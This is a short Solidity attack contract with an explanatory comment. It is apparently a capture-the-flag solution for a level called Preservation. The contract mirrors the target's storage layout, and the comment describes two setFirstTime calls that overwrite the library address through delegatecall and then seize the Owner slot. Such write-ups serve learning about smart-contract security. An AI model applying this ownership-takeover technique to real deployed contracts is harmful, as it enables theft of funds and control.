// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract PreservationAttack {
    address public slot0;
    address public slot1;
    address public Owner;
    uint storedTime;

    function setTime(uint _time) public {
        Owner = msg.sender;
    }
}

/** First we deploy the contract. We will replace the address of the attacker contract for the timeZone1Library. 

So we can run malicious code form our attacking contract through delegatecall form the setFirstTime function

Now what we do in the console is: await contract.setFirstTime(”attacking contract address”)

That will run the code from the LibraryContract contract. In that contract, the logic is basically overwrite the 

variable that is in the first slot, so this logic will be applied in the Preservation Contract and the first variable 

will be updated with the address that we passed 

Now that the first variable is the address of the attacking contract, when we call the setFirstTime function, we will 

run the code from our malicious contract, which basically updates the owner (which is in the slot2). */